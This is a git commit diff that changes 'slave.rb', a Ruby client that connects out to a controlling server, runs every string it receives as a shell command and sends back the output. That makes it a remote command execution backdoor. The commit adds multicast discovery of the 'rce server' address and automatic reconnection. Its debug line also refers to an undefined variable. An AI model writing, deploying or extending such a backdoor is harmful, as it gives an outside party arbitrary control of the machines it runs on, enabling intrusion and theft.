70affc2f1d42bd1bdf1e1773339bcf3d1a5863f3
Snakehater <vigor.turujlija@gmail.com>
2023-01-23 00:06:51 +0100

    Added multicast receiver to find out the ip address of the rce server

--- slave.rb
+++ slave.rb
@@ -1,19 +1,64 @@
 require 'socket'
+require 'ipaddr'
+require 'timeout'
 
-TCPSocket.open("192.168.10.26", 5000) do |s|
-  while true do
-    c = s.recv(1024)
-    if c == "stop" or c == "" then
-      s.write("Closing connection")
-      sleep 2
-      s.close
-      break
-    else
-      begin
-        s.write(`#{c}`)
-      rescue Exception => e
-        s.write(e)
+MCAST_GROUP =
+  {
+    :addr => '224.1.1.1',
+    :port => 5007,
+    :bindaddr => Socket.ip_address_list[1].ip_address
+  }
+
+running = true
+
+ip = ""
+
+while running do # retry connection
+  begin
+    TCPSocket.open(ip, 5000) do |s|
+      while true do # wait for messages
+        c = s.recv(1024)
+        if c == "stop" or c == "" then
+          s.write("Closing connection")
+          sleep 2
+          s.close
+          running = false
+          break
+        else
+          begin
+            s.write(`#{c}`)
+          rescue Exception => e
+            s.write(e)
+          end
+        end
       end
+    end
+  rescue
+    sleep 1
+    bindaddr = MCAST_GROUP[:bindaddr]
+
+    Socket.ip_address_list do |addr_info|
+      if addr_info.ip_address.start_with?('192') then
+        bindaddr = addr_info.ip_address
+      end
+    end
+
+    MCAST_GROUP[:bindaddr] = bindaddr
+
+    begin
+      ip_mcast = IPAddr.new(MCAST_GROUP[:addr]).hton + IPAddr.new(MCAST_GROUP[:bindaddr]).hton
+      s = UDPSocket.open
+      s.setsockopt Socket::IPPROTO_IP, Socket::IP_ADD_MEMBERSHIP, ip_mcast
+      s.bind Socket::INADDR_ANY, MCAST_GROUP[:port]
+
+      Timeout.timeout(5) do 
+        ip, info = s.recvfrom(1024)
+        puts "MSG: #{msg} from #{info[2]} (#{info[3]})/#{info[1]} len #{msg.size}"
+      end
+    rescue
+
+    ensure
+      s.close
     end
   end
 end
